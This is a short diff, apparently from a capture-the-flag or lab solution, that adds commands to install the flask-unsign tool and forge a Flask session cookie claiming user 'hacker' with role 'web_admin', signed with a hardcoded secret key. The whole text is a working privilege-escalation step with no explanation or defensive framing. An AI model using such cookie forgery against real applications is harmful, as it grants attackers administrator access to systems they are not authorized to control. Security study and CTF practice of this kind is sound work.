@@ -1,0 +1,3 @@
+pip install flask-unsign 
+
+flask-unsign --sign --cookie "{'user': 'hacker', 'role': 'web_admin'}" --secret "B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581"
